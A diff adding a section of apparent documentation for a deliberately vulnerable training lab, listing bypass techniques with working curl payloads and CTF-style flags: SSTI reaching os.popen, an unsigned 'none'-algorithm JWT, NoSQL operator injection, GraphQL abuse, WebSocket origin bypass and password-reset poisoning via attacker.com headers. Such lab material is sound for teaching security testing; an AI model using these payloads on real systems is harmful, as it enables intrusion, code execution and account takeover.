@@ -1217,6 +1217,196 @@ Content-Type: application/json
 
 ---
 
+## Intermediate Lab Bypass Techniques
+
+### Overview
+All intermediate labs include at least one bypass method designed for intermediate-level complexity. These bypass techniques simulate real-world scenarios where simple exploitation is blocked by security controls.
+
+### 1. Server-Side Template Injection (SSTI) Bypass Methods
+
+#### Bypass Method 1: Alternate Delimiter Bypass
+**Vulnerability:** WAF blocks standard `{{...}}` delimiters  
+**Bypass:** Use alternate `{%...%}` delimiters
+
+**Exploitation:**
+```bash
+# Standard payload (may be blocked)
+curl "http://localhost:5000/api/vuln/ssti?template={{7*7}}"
+
+# Bypass using alternate delimiters
+curl "http://localhost:5000/api/vuln/ssti?template={%print(7*7)%}"
+# Flag: {SSTI_WAF_BYPASS_ALTERNATE_DELIMITERS}
+```
+
+#### Bypass Method 2: Attribute Chain Bypass
+**Vulnerability:** Filters block direct RCE keywords  
+**Bypass:** Use attribute chaining to access dangerous functions
+
+**Exploitation:**
+```bash
+# Use Python attribute chaining
+curl "http://localhost:5000/api/vuln/ssti?template={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
+# Flag: {SSTI_FILTER_BYPASS_ATTRIBUTE_CHAIN}
+```
+
+### 2. JWT Manipulation Bypass Method
+
+#### Bypass Method: "none" Algorithm Bypass
+**Vulnerability:** Server accepts unsigned JWTs with alg="none"  
+**Bypass:** Remove signature and set algorithm to "none"
+
+**Exploitation:**
+```bash
+# Original JWT header (base64): {"alg":"HS256","typ":"JWT"}
+# Change to: {"alg":"none","typ":"JWT"}
+# Base64 encode: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
+
+# Original payload (base64): {"sub":"1234567890","name":"Guest","admin":false}
+# Change to: {"sub":"1234567890","name":"Guest","admin":true}
+# Base64 encode: eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Ikd1ZXN0IiwiYWRtaW4iOnRydWV9
+
+# Construct token without signature (note the trailing dot)
+curl "http://localhost:5000/api/vuln/jwt-manipulation?token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Ikd1ZXN0IiwiYWRtaW4iOnRydWV9."
+# Flag: {JWT_NONE_ALGORITHM_BYPASS}
+```
+
+### 3. NoSQL Injection Bypass Methods
+
+#### Bypass Method 1: $gt Operator
+**Vulnerability:** Basic $ne blocked but $gt allowed  
+**Bypass:** Use greater-than operator for authentication bypass
+
+**Exploitation:**
+```bash
+curl 'http://localhost:5000/api/vuln/nosql-injection?username={"$gt":""}'
+# Flag: {NOSQL_GT_OPERATOR_BYPASS}
+```
+
+#### Bypass Method 2: $regex Operator
+**Vulnerability:** Regex operators not sanitized  
+**Bypass:** Use regex for pattern-based authentication bypass
+
+**Exploitation:**
+```bash
+curl 'http://localhost:5000/api/vuln/nosql-injection?username={"$regex":"^a"}'
+# Flag: {NOSQL_REGEX_INJECTION}
+```
+
+#### Bypass Method 3: $where JavaScript Execution
+**Vulnerability:** $where clause allows JavaScript execution  
+**Bypass:** Inject JavaScript code for authentication bypass
+
+**Exploitation:**
+```bash
+curl 'http://localhost:5000/api/vuln/nosql-injection?username={"$where":"1==1"}'
+# Flag: {NOSQL_WHERE_CODE_EXECUTION}
+```
+
+### 4. GraphQL Injection Bypass Methods
+
+#### Bypass Method 1: Introspection Query
+**Vulnerability:** Introspection not disabled in production  
+**Bypass:** Query schema to discover hidden fields
+
+**Exploitation:**
+```bash
+curl 'http://localhost:5000/api/vuln/graphql-injection?query={__schema{types{name}}}'
+# Flag: {GRAPHQL_INTROSPECTION_BYPASS}
+```
+
+#### Bypass Method 2: Query Batching
+**Vulnerability:** Multiple queries allowed in single request  
+**Bypass:** Batch multiple queries to extract more data
+
+**Exploitation:**
+```bash
+curl 'http://localhost:5000/api/vuln/graphql-injection?query=[{users{id}},{posts{title}}]'
+# Flag: {GRAPHQL_BATCH_QUERY_BYPASS}
+```
+
+#### Bypass Method 3: Deep Nesting / Depth Limit Bypass
+**Vulnerability:** No query depth limits enforced  
+**Bypass:** Use deeply nested queries to access sensitive data
+
+**Exploitation:**
+```bash
+curl 'http://localhost:5000/api/vuln/graphql-injection?query={users{posts{comments{author{posts{comments{id}}}}}}}'
+# Flag: {GRAPHQL_DEPTH_LIMIT_BYPASS}
+```
+
+#### Bypass Method 4: __typename Field Suggestion
+**Vulnerability:** Type information exposes sensitive fields  
+**Bypass:** Use __typename to discover field types
+
+**Exploitation:**
+```bash
+curl 'http://localhost:5000/api/vuln/graphql-injection?query={users{id,username,__typename}}'
+# Flag: {GRAPHQL_TYPENAME_DISCLOSURE}
+```
+
+### 5. WebSocket Manipulation Bypass Method
+
+#### Bypass Method: Origin Validation Bypass
+**Vulnerability:** Weak origin validation using substring check  
+**Bypass:** Use domain with "trusted" substring
+
+**Exploitation Using Burp Suite:**
+1. Intercept WebSocket upgrade request
+2. Modify Origin header to: `http://evil.trusted.com` or `http://trusted-attacker.com`
+3. Server accepts connection due to substring match
+4. Flag: {WEBSOCKET_ORIGIN_VALIDATION_BYPASS}
+
+### 6. HTTP Host Header Injection Bypass Methods
+
+#### Bypass Method 1: X-Forwarded-Host Header
+**Vulnerability:** Application trusts X-Forwarded-Host over Host  
+**Bypass:** Use X-Forwarded-Host to poison reset links
+
+**Exploitation Using Burp Suite:**
+1. Intercept password reset request
+2. Add header: `X-Forwarded-Host: attacker.com`
+3. Server uses X-Forwarded-Host in reset link
+4. Flag: {HOST_HEADER_X_FORWARDED_HOST_BYPASS}
+
+**Using curl:**
+```bash
+curl -X POST "http://localhost:5000/api/vuln/host-header-injection/reset" \
+  -H "Content-Type: application/json" \
+  -H "X-Forwarded-Host: evil.com" \
+  -d '{"email":"victim@company.com"}'
+```
+
+#### Bypass Method 2: X-Original-Host Header
+**Vulnerability:** Alternative header not sanitized  
+**Bypass:** Use X-Original-Host header
+
+**Exploitation:**
+```bash
+curl -X POST "http://localhost:5000/api/vuln/host-header-injection/reset" \
+  -H "Content-Type: application/json" \
+  -H "X-Original-Host: attacker.com" \
+  -d '{"email":"victim@company.com"}'
+# Flag: {HOST_HEADER_X_ORIGINAL_HOST_BYPASS}
+```
+
+### 7. Labs with Existing Bypass Methods
+
+The following labs already include intermediate-level bypass methods:
+
+**LDAP Injection:**
+- Wildcard bypass: `username=*` bypasses authentication
+- Flag: {LDAP_INJECTION_WILDCARD_BYPASS}
+
+**Advanced CSRF:**
+- SameSite=None cookie bypass allows cross-site requests
+- Flag: {CSRF_SAMESITE_BYPASS}
+
+**Race Condition:**
+- TOCTOU (Time-of-check-time-of-use) exploitation
+- Flag: {RACE_CONDITION_EXPLOITED_MULTIPLE_USES}
+
+---
+
 ## Advanced Testing Tools and Techniques
 
 ### Automated Testing Tools
